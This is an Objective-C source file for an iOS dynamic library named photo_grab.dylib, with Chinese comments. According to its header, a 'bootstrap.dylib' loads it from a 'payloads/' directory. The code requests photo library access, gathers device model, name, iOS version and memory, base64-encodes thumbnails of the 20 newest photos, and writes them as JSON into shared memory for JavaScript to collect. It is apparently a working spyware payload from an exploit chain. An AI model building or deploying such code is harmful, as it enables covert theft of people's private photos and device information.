/**
 * photo_grab.dylib — iPad 照片采集模块
 *
 * 编译: xcrun --sdk iphoneos clang -arch arm64 -dynamiclib
 *          -fobjc-arc -mios-version-min=14.0
 *          -framework Foundation -framework Photos -framework UIKit
 *          -o photo_grab.dylib photo_grab.c
 *
 * 部署: 放 payloads/ 目录，bootstrap.dylib 会 dlopen 加载
 *
 * 共享内存布局:
 *   +0x00  uint32_t  state (7=UA=数据就绪，通知 JS 读取)
 *   +0x04  uint32_t  data_length
 *   +0x08  char[]    JSON 数据
 */

#import <Foundation/Foundation.h>
#import <Photos/Photos.h>
#import <UIKit/UIKit.h>
#import <sys/sysctl.h>
#import <stdint.h>
#import <string.h>

#define STATE_READY 7
#define MAX_OUTPUT  (8 * 1024 * 1024)
#define THUMB_SIZE  200
#define JPEG_QUALITY 0.35f
#define MAX_PHOTOS  20

static void write_buffer(uint32_t *buf, const char *json, size_t len) {
    if (len > MAX_OUTPUT - 8) len = MAX_OUTPUT - 8;
    memcpy((uint8_t *)buf + 8, json, len);
    buf[1] = (uint32_t)len;
    buf[0] = STATE_READY;
}

static NSString *hw_machine(void) {
    size_t sz = 0;
    sysctlbyname("hw.machine", NULL, &sz, NULL, 0);
    if (sz == 0) return @"unknown";
    char *m = (char *)malloc(sz);
    sysctlbyname("hw.machine", m, &sz, NULL, 0);
    NSString *s = [NSString stringWithUTF8String:m];
    free(m);
    return s;
}

static NSString *hw_memsize(void) {
    uint64_t mem = 0;
    size_t sz = sizeof(mem);
    sysctlbyname("hw.memsize", &mem, &sz, NULL, 0);
    return [NSString stringWithFormat:@"%.1f GB", (double)mem / 1073741824.0];
}

__attribute__((visibility("default")))
void _process(uint32_t *shared) {
    @autoreleasepool {
        // ═══ 1. 请求相册权限 ═══════════════════════════════════
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        __block PHAuthorizationStatus auth = PHAuthorizationStatusNotDetermined;

        [PHPhotoLibrary requestAuthorizationForAccessLevel:PHAccessLevelReadWrite
            handler:^(PHAuthorizationStatus s) {
                auth = s;
                dispatch_semaphore_signal(sem);
            }];

        dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 15ULL * NSEC_PER_SEC));

        if (auth != PHAuthorizationStatusAuthorized &&
            auth != PHAuthorizationStatusLimited) {
            const char *err = "{\"error\":\"permission_denied\",\"photos\":[]}";
            write_buffer(shared, err, strlen(err));
            return;
        }

        // ═══ 2. 设备信息 ═══════════════════════════════════════
        NSString *model  = hw_machine();
        NSString *name   = [[UIDevice currentDevice] name] ?: @"";
        NSString *ios    = [[UIDevice currentDevice] systemVersion] ?: @"";
        NSString *memsz  = hw_memsize();
        NSProcessInfo *pi = [NSProcessInfo processInfo];

        NSString *json = [NSString stringWithFormat:
            @"{\"status\":\"ok\",\"device\":\"%@\",\"name\":\"%@\",\"ios\":\"%@\","
            @"\"ram\":\"%@\",\"cores\":%lu,\"photos\":[",
            model, name, ios, memsz,
            (unsigned long)pi.processorCount];

        // ═══ 3. 遍历照片（同步模式） ═══════════════════════════
        PHFetchOptions *opt = [[PHFetchOptions alloc] init];
        opt.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:NO]];
        opt.fetchLimit = MAX_PHOTOS;

        PHFetchResult<PHAsset *> *assets =
            [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeImage options:opt];

        PHImageRequestOptions *req = [[PHImageRequestOptions alloc] init];
        req.synchronous = YES;
        req.deliveryMode = PHImageRequestOptionsDeliveryModeFastFormat;
        req.resizeMode = PHImageRequestOptionsResizeModeExact;
        req.networkAccessAllowed = NO;

        NSMutableString *photosJson = [NSMutableString string];
        __block NSUInteger count = 0;

        for (PHAsset *asset in assets) {
            if (json.length + photosJson.length > MAX_OUTPUT - 4096) break;

            [[PHImageManager defaultManager]
                requestImageForAsset:asset
                targetSize:CGSizeMake(THUMB_SIZE, THUMB_SIZE)
                contentMode:PHImageContentModeAspectFill
                options:req
                resultHandler:^(UIImage *img, NSDictionary *info) {
                    if (img) {
                        NSData *jpeg = UIImageJPEGRepresentation(img, JPEG_QUALITY);
                        if (jpeg) {
                            @synchronized (photosJson) {
                                if (count > 0) [photosJson appendString:@","];
                                NSString *b64str = [jpeg base64EncodedStringWithOptions:0];
                                // 缩略图超过 40KB 就只保留元数据，不存 base64
                                if (jpeg.length < 40960) {
                                    [photosJson appendFormat:
                                        @"{\"w\":%.0f,\"h\":%.0f,\"date\":\"%@\","
                                        @"\"size\":%lu,\"thumb\":\"data:image/jpeg;base64,%@\"}",
                                        img.size.width, img.size.height,
                                        asset.creationDate ? [asset.creationDate description] : @"unknown",
                                        (unsigned long)jpeg.length, b64str];
                                } else {
                                    [photosJson appendFormat:
                                        @"{\"w\":%.0f,\"h\":%.0f,\"date\":\"%@\",\"size\":%lu}",
                                        img.size.width, img.size.height,
                                        asset.creationDate ? [asset.creationDate description] : @"unknown",
                                        (unsigned long)jpeg.length];
                                }
                                count++;
                            }
                        }
                    }
                }];
        }

        // ═══ 4. 组合 JSON 写入共享内存 ═════════════════════════
        NSString *full = [NSString stringWithFormat:@"%@%@]}",
                          json, photosJson];
        const char *cstr = [full UTF8String];
        write_buffer(shared, cstr, strlen(cstr));
    }
}
